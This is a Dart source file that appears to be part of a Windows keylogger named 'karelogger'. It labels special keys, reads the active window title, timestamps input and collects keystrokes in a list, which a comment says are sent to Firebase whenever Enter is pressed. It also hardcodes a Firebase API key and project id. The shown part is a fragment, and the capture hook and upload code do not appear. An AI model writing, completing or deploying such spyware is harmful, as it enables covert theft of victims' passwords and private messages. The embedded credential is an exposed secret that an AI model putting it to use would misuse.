import 'package:ffi/ffi.dart';
import 'package:win32/win32.dart';

///to initialize the firebase
const apiKey = 'AIzaSyCYM5APCDN5L1NUu-r_iAPd_KIfd18BL_U';
const projectId = 'karelogger-c18f4';

///to hold the charicters of the key pressed when return from switch
String char = "";

///to check if the key is special key or not like tap or caps lock
bool specialKeys(int S_Key) {
  switch (S_Key) {
    case VK_SPACE:
      char = " ";
      return true;
    case VK_RETURN:
      char = " [enter]\n";
      return true;
    case VK_SHIFT:
      char = " #SHIFT ";
      return true;
    case VK_BACK:
      char = " [BACK] ";
      return true;
    case VK_RBUTTON:
      char = " R_CLICK ";

      return true;
    case VK_CAPITAL:
      char = "#CAPS_LOCK";
      return true;
    case VK_TAB:
      char = " #TAB ";
      return true;
    case VK_UP:
      char = " #UP ";
      return true;
    case VK_DOWN:
      char = " #DOWN ";

      return true;
    case VK_LEFT:
      char = "#LEFT";

      return true;
    case VK_RIGHT:
      char = "#RIGHT";
      return true;
    case VK_CONTROL:
      char = "#CONTROL";

      return true;
    case VK_MENU:
      char = "#ALT";

      return true;
    default:
      return false;
  }
}

///fucntion to get the active window title
String getActiveWindowTitle() {
  final length = GetWindowTextLength(GetForegroundWindow());
  if (length == 0) {
    return '';
  }
  final buffer = wsalloc(length + 1);
  GetWindowText(GetForegroundWindow(), buffer, length + 1);
  final title = buffer.toDartString();
  free(buffer);

  return title + "\n";
}

///to prevent duplicate active window title in the local key list
String activeWindow = "";

/// to get current time
String getTime() {
  var now = new DateTime.now();
  return now.toString();
}

///to get the key and upload them when press enter to firebase
List keys = [];

///FUNCTION TO GET THE KEYBOARD INPUT AND add it to the list
void addKeyToList(String key) {
  keys.add(key);
}
